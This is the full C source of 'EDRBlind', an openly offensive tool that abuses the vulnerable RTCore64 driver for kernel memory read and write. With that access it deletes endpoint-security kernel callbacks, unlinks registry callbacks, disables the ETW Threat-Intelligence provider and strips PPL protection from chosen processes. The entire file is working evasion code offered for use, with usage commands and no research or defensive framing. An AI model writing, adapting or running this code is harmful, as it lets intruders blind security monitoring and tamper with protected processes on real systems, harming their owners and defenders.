/*
 * EDRBlind.c -- combined RTCore64 BYOVD tool
 *
 * RTCore64.sys must be loaded before running.
 * Reads offsets from config.txt (run Offset_Resolver.exe first).
 *
 * Usage:
 *   EDRBlind.exe callbacks list
 *   EDRBlind.exe callbacks delete <driver.sys> [driver2.sys ...]
 *   EDRBlind.exe etwti list
 *   EDRBlind.exe etwti disable
 *   EDRBlind.exe ppl list
 *   EDRBlind.exe ppl delete <process.exe> [process2.exe ...]
 */

#include <Windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "psapi.lib")

#define LOG_INFO(...) (printf("[*] "), printf(__VA_ARGS__), putchar('\n'))
#define LOG_OK(...)   (printf("[+] "), printf(__VA_ARGS__), putchar('\n'))
#define LOG_ERR(...)  (printf("[-] "), printf(__VA_ARGS__), putchar('\n'))
#define LOG_WARN(...) (printf("[!] "), printf(__VA_ARGS__), putchar('\n'))

#define RTCORE_DEVICE      "\\\\.\\RTCore64"
#define RTCORE_IOCTL_READ  0x80002048
#define RTCORE_IOCTL_WRITE 0x8000204C
#define CFG_FILE           "config.txt"

#define MAX_CALLBACKS    64
#define MAX_LIST_NODES   64
#define MAX_REG_NODES   128
#define MAX_EPROC_WALK  512
#define MAX_TARGETS      32

#define IS_KERN_VA(x) ((DWORD64)(x) >= 0xFFFF800000000000ULL)

/* ═══════════════════════════════════════════════════════════════════════════
 * RTCore64 primitives
 * ═══════════════════════════════════════════════════════════════════════════ */

#pragma pack(push, 1)
typedef struct {
    BYTE    pad0[8];
    DWORD64 Address;
    BYTE    pad1[8];
    DWORD   Size;
    DWORD   Value;
    BYTE    pad2[16];
} RTCORE_MEM;
#pragma pack(pop)

static HANDLE g_device = INVALID_HANDLE_VALUE;

static DWORD kread32(DWORD64 addr)
{
    RTCORE_MEM req = {0}; DWORD bytes_out = 0;
    req.Address = addr; req.Size = 4;
    DeviceIoControl(g_device, RTCORE_IOCTL_READ,
                    &req, sizeof req, &req, sizeof req, &bytes_out, NULL);
    return req.Value;
}

static DWORD64 kread64(DWORD64 addr)
{
    return ((DWORD64)kread32(addr + 4) << 32) | kread32(addr);
}

static void kwrite32(DWORD64 addr, DWORD val)
{
    RTCORE_MEM req = {0}; DWORD bytes_out = 0;
    req.Address = addr; req.Size = 4; req.Value = val;
    DeviceIoControl(g_device, RTCORE_IOCTL_WRITE,
                    &req, sizeof req, &req, sizeof req, &bytes_out, NULL);
}

static void kwrite64(DWORD64 addr, DWORD64 val)
{
    kwrite32(addr + 4, (DWORD)(val >> 32));
    kwrite32(addr,     (DWORD)(val & 0xFFFFFFFF));
}

static void kwrite8(DWORD64 addr, BYTE val)
{
    DWORD64 aligned = addr & ~(DWORD64)3;
    int     shift   = (int)(addr & 3) * 8;
    DWORD   dw      = kread32(aligned);
    kwrite32(aligned, (dw & ~(0xFFUL << shift)) | ((DWORD)val << shift));
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Kernel offsets
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    DWORD64 PspCreateProcessNotifyRoutine;
    DWORD64 PspCreateThreadNotifyRoutine;
    DWORD64 PspLoadImageNotifyRoutine;
    DWORD64 ObTypeIndexTable;
    DWORD64 CallbackListHead;
    DWORD64 EtwpDebuggerData;
    DWORD64 PsInitialSystemProcess;
    DWORD   EtwpGuidHashTableOff;
    DWORD   EprocLinksOff;
    DWORD   EprocNameOff;
    DWORD   EprocProtOff;
} KERN_OFFSETS;

static KERN_OFFSETS g_offsets;

static BOOL load_config(const char *path)
{
    FILE              *fp;
    char               line[256];
    unsigned long long val64;
    unsigned long      val32;

    if (fopen_s(&fp, path, "r") != 0 || !fp) {
        LOG_ERR("Cannot read config: %s", path);
        LOG_ERR("Run Offset_Resolver.exe first");
        return FALSE;
    }

    while (fgets(line, sizeof line, fp)) {
        if      (sscanf_s(line, "PspCreateProcessNotifyRoutine=0x%llX", &val64) == 1)
            g_offsets.PspCreateProcessNotifyRoutine = val64;
        else if (sscanf_s(line, "PspCreateThreadNotifyRoutine=0x%llX",  &val64) == 1)
            g_offsets.PspCreateThreadNotifyRoutine  = val64;
        else if (sscanf_s(line, "PspLoadImageNotifyRoutine=0x%llX",     &val64) == 1)
            g_offsets.PspLoadImageNotifyRoutine     = val64;
        else if (sscanf_s(line, "ObTypeIndexTable=0x%llX",              &val64) == 1)
            g_offsets.ObTypeIndexTable              = val64;
        else if (sscanf_s(line, "CallbackListHead=0x%llX",              &val64) == 1)
            g_offsets.CallbackListHead              = val64;
        else if (sscanf_s(line, "EtwpDebuggerData=0x%llX",              &val64) == 1)
            g_offsets.EtwpDebuggerData              = val64;
        else if (sscanf_s(line, "PsInitialSystemProcess=0x%llX",        &val64) == 1)
            g_offsets.PsInitialSystemProcess        = val64;
        else if (sscanf_s(line, "EtwpGuidHashTableOff=0x%lX",           &val32) == 1)
            g_offsets.EtwpGuidHashTableOff          = val32;
        else if (sscanf_s(line, "EprocLinksOff=0x%lX",                  &val32) == 1)
            g_offsets.EprocLinksOff                 = val32;
        else if (sscanf_s(line, "EprocNameOff=0x%lX",                   &val32) == 1)
            g_offsets.EprocNameOff                  = val32;
        else if (sscanf_s(line, "EprocProtOff=0x%lX",                   &val32) == 1)
            g_offsets.EprocProtOff                  = val32;
    }

    fclose(fp);

    if (!g_offsets.PspCreateProcessNotifyRoutine || !g_offsets.ObTypeIndexTable  ||
        !g_offsets.CallbackListHead              || !g_offsets.EtwpDebuggerData   ||
        !g_offsets.PsInitialSystemProcess        || !g_offsets.EprocLinksOff) {
        LOG_ERR("Config incomplete or corrupt: %s", path);
        return FALSE;
    }

    LOG_OK("Config loaded from %s", path);
    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Driver enumeration (shared)
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct { DWORD64 Base; char Name[MAX_PATH]; } DRIVER_INFO;

static DRIVER_INFO g_drivers[1024];
static DWORD       g_driver_count = 0;

static int drvcmp(const void *a, const void *b)
{
    const DRIVER_INFO *x = (const DRIVER_INFO *)a;
    const DRIVER_INFO *y = (const DRIVER_INFO *)b;
    return x->Base < y->Base ? -1 : x->Base > y->Base ? 1 : 0;
}

static DWORD64 enum_drivers(void)
{
    LPVOID buf[1024]; DWORD bytes_needed = 0, i;

    if (!EnumDeviceDrivers(buf, sizeof buf, &bytes_needed) || bytes_needed == 0) {
        LOG_ERR("EnumDeviceDrivers failed (%lu)", GetLastError());
        return 0;
    }

    g_driver_count = bytes_needed / sizeof(LPVOID);
    if (g_driver_count > 1024) g_driver_count = 1024;

    for (i = 0; i < g_driver_count; i++) {
        g_drivers[i].Base = (DWORD64)buf[i];
        if (!GetDeviceDriverBaseNameA(buf[i], g_drivers[i].Name, sizeof g_drivers[i].Name))
            strcpy_s(g_drivers[i].Name, sizeof g_drivers[i].Name, "unknown");
    }
    qsort(g_drivers, g_driver_count, sizeof(DRIVER_INFO), drvcmp);

    for (i = 0; i < g_driver_count; i++)
        if (_stricmp(g_drivers[i].Name, "ntoskrnl.exe") == 0)
            return g_drivers[i].Base;
    return g_driver_count ? g_drivers[0].Base : 0;
}

static const char *drv_name(DWORD64 address)
{
    DWORD i;
    for (i = 0; i + 1 < g_driver_count; i++)
        if (address >= g_drivers[i].Base && address < g_drivers[i + 1].Base)
            return g_drivers[i].Name;
    if (g_driver_count > 0 &&
        address >= g_drivers[g_driver_count - 1].Base &&
        address <  g_drivers[g_driver_count - 1].Base + 0x4000000)
        return g_drivers[g_driver_count - 1].Name;
    return "unknown";
}

/* ═══════════════════════════════════════════════════════════════════════════
 * CALLBACKS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* CALLBACK_ENTRY_ITEM offsets */
#define CEI_ACTIVE        0x014
#define CEI_PREOPERATION  0x028
#define CEI_POSTOPERATION 0x030
#define OB_CALLBACK_LIST_OFF 0x0C8

/* _CMREG_CALLBACK offsets */
#define CMREG_BLINK    0x008
#define CMREG_FUNCTION 0x028

static BOOL target_matches(const char *name, const char **targets, int n)
{
    int i;
    for (i = 0; i < n; i++)
        if (_stricmp(name, targets[i]) == 0) return TRUE;
    return FALSE;
}

static void psp_notify_walk(DWORD64 kern_base, const char *label, DWORD64 array_rva,
                            BOOL list_mode, const char **targets, int target_count)
{
    DWORD64 array_va = kern_base + array_rva;
    int     i;

    if (list_mode) LOG_OK("Psp%sNotifyRoutine @ 0x%016llX", label, array_va);

    for (i = 0; i < MAX_CALLBACKS; i++) {
        DWORD64     slot_addr = array_va + (DWORD64)i * 8;
        DWORD64     slot      = kread64(slot_addr);
        DWORD64     cb_block, fn_addr;
        const char *driver;

        if (!slot) continue;
        cb_block = slot & ~(DWORD64)0xF;
        if (!IS_KERN_VA(cb_block)) continue;
        fn_addr = kread64(cb_block + 0x08);
        if (!fn_addr) continue;

        driver = drv_name(fn_addr);
        if (list_mode) printf("  [%2d]  0x%016llX  %s\n", i, fn_addr, driver);

        if (target_count > 0 && target_matches(driver, targets, target_count)) {
            kwrite64(slot_addr, 0);
            LOG_OK("Removed %s callback  slot=%d  fn=0x%016llX  [%s]",
                   label, i, fn_addr, driver);
        }
    }

    if (list_mode) printf("\n");
}

static void ob_callback_walk(DWORD64 kern_base, const char *label, int type_index,
                             BOOL list_mode, const char **targets, int target_count)
{
    DWORD64 obj_type  = kread64(kern_base + g_offsets.ObTypeIndexTable
                                          + (DWORD64)type_index * 8);
    DWORD64 list_head, node;
    int     count = 0;

    if (!obj_type || !IS_KERN_VA(obj_type)) {
        if (list_mode) LOG_WARN("%s: object type not readable - skipped", label);
        return;
    }

    list_head = obj_type + OB_CALLBACK_LIST_OFF;
    node      = kread64(list_head);

    if (list_mode) LOG_OK("ObCallbacks: %s", label);

    while (node && node != list_head && IS_KERN_VA(node) && count < MAX_LIST_NODES) {
        DWORD64     pre    = kread64(node + CEI_PREOPERATION);
        DWORD64     post   = kread64(node + CEI_POSTOPERATION);
        const char *driver = pre  ? drv_name(pre)
                           : post ? drv_name(post) : "unknown";

        if (list_mode)
            printf("  node=0x%016llX  Active=%u  Pre=0x%016llX  [%s]\n",
                   node, kread32(node + CEI_ACTIVE), pre, driver);

        if (target_count > 0 && target_matches(driver, targets, target_count)
            && kread32(node + CEI_ACTIVE)) {
            kwrite32(node + CEI_ACTIVE, 0);
            LOG_OK("Disabled ObCallback [%s]  [%s]", label, driver);
        }

        node = kread64(node);
        count++;
    }

    if (list_mode && count == 0) printf("  (empty)\n");
    if (list_mode) printf("\n");
}

static void registry_callback_walk(DWORD64 kern_base, BOOL list_mode,
                                   const char **targets, int target_count)
{
    DWORD64 list_head = kern_base + g_offsets.CallbackListHead;
    DWORD64 prev_node = list_head;
    DWORD64 node      = kread64(list_head);
    int     count = 0;

    if (list_mode)
        LOG_OK("Registry Callbacks  (CallbackListHead @ 0x%016llX)", list_head);

    while (node && node != list_head && IS_KERN_VA(node) && count < MAX_REG_NODES) {
        DWORD64     next_node = kread64(node);
        DWORD64     fn_addr   = kread64(node + CMREG_FUNCTION);
        const char *driver    = fn_addr ? drv_name(fn_addr) : "unknown";

        if (!next_node || !IS_KERN_VA(next_node)) break;

        if (list_mode)
            printf("  node=0x%016llX  fn=0x%016llX  [%s]\n", node, fn_addr, driver);

        if (target_count > 0 && target_matches(driver, targets, target_count)) {
            kwrite64(prev_node,               next_node);
            kwrite64(next_node + CMREG_BLINK, prev_node);
            LOG_OK("Unlinked registry callback  node=0x%016llX  [%s]", node, driver);
        } else {
            prev_node = node;
        }

        node = next_node;
        count++;
    }

    if (list_mode && count == 0) printf("  (empty)\n");
    if (list_mode) printf("\n");
}

static void cmd_callbacks(DWORD64 kern_base, BOOL list_mode,
                          const char **targets, int target_count)
{
    psp_notify_walk(kern_base, "CreateProcess",
                    g_offsets.PspCreateProcessNotifyRoutine, list_mode, targets, target_count);
    psp_notify_walk(kern_base, "CreateThread",
                    g_offsets.PspCreateThreadNotifyRoutine,  list_mode, targets, target_count);
    psp_notify_walk(kern_base, "LoadImage",
                    g_offsets.PspLoadImageNotifyRoutine,     list_mode, targets, target_count);
    ob_callback_walk(kern_base, "Process Handle", 7, list_mode, targets, target_count);
    ob_callback_walk(kern_base, "Thread Handle",  8, list_mode, targets, target_count);
    registry_callback_walk(kern_base, list_mode, targets, target_count);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ETW-TI
 * ═══════════════════════════════════════════════════════════════════════════ */

#define ETW_GUID_OFF     0x028
#define ETW_PROV_OFF     0x060
#define ETW_SLOTS_OFF    0x080
#define ETW_LOGGERID_OFF 0x004
#define ETW_SLOT_SZ      0x020
#define ETW_BUCKET_SZ    0x038
#define ETW_BUCKET_IDX   29
#define TI_GUID_DATA1    0xF4E1897CUL
#define ETW_SILO_PTR_OFF 0x18

static void cmd_etwti(DWORD64 kern_base, BOOL list_mode, BOOL disable)
{
    DWORD64 etw_silo, bucket_head, node, ti_entry = 0;
    int     guard = 0, slot;

    etw_silo = kread64(kern_base + g_offsets.EtwpDebuggerData + ETW_SILO_PTR_OFF);
    if (IS_KERN_VA(etw_silo)) {
        bucket_head = etw_silo + g_offsets.EtwpGuidHashTableOff
                               + (DWORD64)ETW_BUCKET_IDX * ETW_BUCKET_SZ;
        node = kread64(bucket_head);
        while (node && node != bucket_head && IS_KERN_VA(node) && guard++ < MAX_LIST_NODES) {
            if (kread32(node + ETW_GUID_OFF) == TI_GUID_DATA1) { ti_entry = node; break; }
            node = kread64(node);
        }
    }

    if (list_mode) {
        printf("[+] ETW-TI (Microsoft-Windows-Threat-Intelligence)\n");
        if (!ti_entry) { printf("  (provider not found - ETW-TI inactive)\n\n"); return; }
        printf("  entry=0x%016llX  ProviderEnabled=%u\n",
               ti_entry, kread32(ti_entry + ETW_PROV_OFF));
        for (slot = 0; slot < 8; slot++) {
            DWORD64 slot_addr = ti_entry + ETW_SLOTS_OFF + (DWORD64)slot * ETW_SLOT_SZ;
            if (kread32(slot_addr))
                printf("  Slot %d: Enabled  LoggerId=%u\n",
                       slot, (kread32(slot_addr + ETW_LOGGERID_OFF) >> 16) & 0xFFFF);
        }
        printf("\n");
    }

    if (disable) {
        if (!ti_entry) { LOG_ERR("TI provider entry not found"); return; }
        kwrite32(ti_entry + ETW_PROV_OFF, 0);
        for (slot = 0; slot < 8; slot++)
            kwrite32(ti_entry + ETW_SLOTS_OFF + (DWORD64)slot * ETW_SLOT_SZ, 0);
        LOG_OK("ETW-TI disabled  (entry=0x%016llX)", ti_entry);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * PPL
 * ═══════════════════════════════════════════════════════════════════════════ */

static void kread_name(DWORD64 address, char out[16])
{
    int i;
    for (i = 0; i < 16; i += 4) { DWORD d = kread32(address + i); memcpy(out + i, &d, 4); }
    out[15] = '\0';
}

static BYTE read_prot(DWORD64 eproc)
{
    DWORD64 aligned = (eproc + g_offsets.EprocProtOff) & ~(DWORD64)3;
    int     shift   = (int)((eproc + g_offsets.EprocProtOff) & 3) * 8;
    return (BYTE)(kread32(aligned) >> shift);
}

static BOOL prot_valid(BYTE p)
{
    BYTE type = p & 0x7, signer = (p >> 4) & 0xF;
    return type >= 1 && type <= 2 && signer >= 1 && signer <= 8;
}

static void print_prot(const char *name, BYTE p)
{
    static const char *Type[]   = { "None", "PPL", "Protected" };
    static const char *Signer[] = { "None", "Authenticode", "CodeGen",
                                    "Antimalware", "Lsa", "Windows",
                                    "WinTcb", "WinSystem", "App" };
    BYTE type = p & 0x7, signer = (p >> 4) & 0xF;
    printf("  %-20s  0x%02X  %-11s  %s\n", name, p,
           type   < 3 ? Type[type]     : "?",
           signer < 9 ? Signer[signer] : "?");
}

static void cmd_ppl(DWORD64 kern_base, BOOL list_mode,
                    const char **targets, int target_count)
{
    DWORD64 sys_eproc = kread64(kern_base + g_offsets.PsInitialSystemProcess);
    DWORD64 eproc, next_link;
    char    name[16];
    BYTE    prot;
    int     guard = 0;
    BOOL   *found = NULL;

    if (!IS_KERN_VA(sys_eproc)) {
        LOG_ERR("PsInitialSystemProcess unreadable (0x%016llX)", sys_eproc);
        return;
    }

    if (target_count > 0) found = (BOOL *)calloc(target_count, sizeof(BOOL));

    if (list_mode)
        printf("[+] PPL-protected processes:\n"
               "  %-20s  %-4s  %-11s  %s\n", "Name", "Byte", "Type", "Signer");

    eproc = sys_eproc;
    do {
        if (!IS_KERN_VA(eproc)) break;
        prot = read_prot(eproc);
        kread_name(eproc + g_offsets.EprocNameOff, name);

        if (list_mode && prot_valid(prot)) print_prot(name, prot);

        if (target_count > 0) {
            int t;
            for (t = 0; t < target_count; t++) {
                if (_stricmp(name, targets[t]) == 0) {
                    if (prot) {
                        kwrite8(eproc + g_offsets.EprocProtOff, 0);
                        LOG_OK("Stripped PPL on %s (was 0x%02X)", name, prot);
                    } else {
                        LOG_INFO("%s found but not protected", name);
                    }
                    if (found) found[t] = TRUE;
                    break;
                }
            }
        }

        next_link = kread64(eproc + g_offsets.EprocLinksOff);
        if (!next_link || !IS_KERN_VA(next_link)) break;
        eproc = next_link - g_offsets.EprocLinksOff;

    } while (IS_KERN_VA(eproc) && eproc != sys_eproc && ++guard < MAX_EPROC_WALK);

    if (found) {
        int t;
        for (t = 0; t < target_count; t++)
            if (!found[t]) LOG_ERR("'%s' not found", targets[t]);
        free(found);
    }

    if (list_mode) printf("\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Entry point
 * ═══════════════════════════════════════════════════════════════════════════ */

static void usage(void)
{
    printf(
        "EDRBlind.exe -- RTCore64 BYOVD tool (callbacks + etwti + ppl)\n"
        "RTCore64.sys must be loaded. Reads offsets from %s.\n"
        "\n"
        "  EDRBlind.exe callbacks list\n"
        "  EDRBlind.exe callbacks delete <driver.sys> [driver2.sys ...]\n"
        "  EDRBlind.exe etwti list\n"
        "  EDRBlind.exe etwti disable\n"
        "  EDRBlind.exe ppl list\n"
        "  EDRBlind.exe ppl delete <process.exe> [process2.exe ...]\n",
        CFG_FILE);
}

int main(int argc, char *argv[])
{
    const char *module, *subcmd;
    const char *targets[MAX_TARGETS];
    int         target_count = 0;
    DWORD64     kern_base;
    BOOL        success = FALSE;
    int         i;

    if (argc < 3) { usage(); return 1; }

    module = argv[1];
    subcmd = argv[2];

    for (i = 3; i < argc && target_count < MAX_TARGETS; i++)
        targets[target_count++] = argv[i];

    if (_stricmp(module, "callbacks") == 0) {
        if (_stricmp(subcmd, "list")   != 0 &&
            _stricmp(subcmd, "delete") != 0) { usage(); return 1; }
        if (_stricmp(subcmd, "delete") == 0 && target_count == 0) {
            LOG_ERR("'callbacks delete' requires at least one driver name");
            return 1;
        }
    } else if (_stricmp(module, "etwti") == 0) {
        if (_stricmp(subcmd, "list")    != 0 &&
            _stricmp(subcmd, "disable") != 0) { usage(); return 1; }
    } else if (_stricmp(module, "ppl") == 0) {
        if (_stricmp(subcmd, "list")   != 0 &&
            _stricmp(subcmd, "delete") != 0) { usage(); return 1; }
        if (_stricmp(subcmd, "delete") == 0 && target_count == 0) {
            LOG_ERR("'ppl delete' requires at least one process name");
            return 1;
        }
    } else {
        usage(); return 1;
    }

    if (!load_config(CFG_FILE)) return 1;

    g_device = CreateFileA(RTCORE_DEVICE, GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_device == INVALID_HANDLE_VALUE) {
        LOG_ERR("RTCore64 open failed (%lu) - is RTCore64.sys loaded?", GetLastError());
        return 1;
    }

    kern_base = enum_drivers();
    if (!kern_base) { LOG_ERR("failed to build the driver table"); goto done; }
    LOG_OK("Kernel base (ntoskrnl.exe): 0x%016llX\n", kern_base);

    if ((kread32(kern_base) & 0xFFFF) != 0x5A4D) {
        LOG_ERR("kernel read sanity check failed");
        goto done;
    }

    if (_stricmp(module, "callbacks") == 0) {
        BOOL is_list = _stricmp(subcmd, "list") == 0;
        cmd_callbacks(kern_base, is_list,
                      is_list ? NULL    : targets,
                      is_list ? 0       : target_count);

    } else if (_stricmp(module, "etwti") == 0) {
        cmd_etwti(kern_base,
                  _stricmp(subcmd, "list")    == 0,
                  _stricmp(subcmd, "disable") == 0);

    } else if (_stricmp(module, "ppl") == 0) {
        BOOL is_list = _stricmp(subcmd, "list") == 0;
        cmd_ppl(kern_base, is_list,
                is_list ? NULL    : targets,
                is_list ? 0       : target_count);
    }

    LOG_INFO("Done.");
    success = TRUE;

done:
    if (g_device != INVALID_HANDLE_VALUE) CloseHandle(g_device);
    return success ? 0 : 1;
}
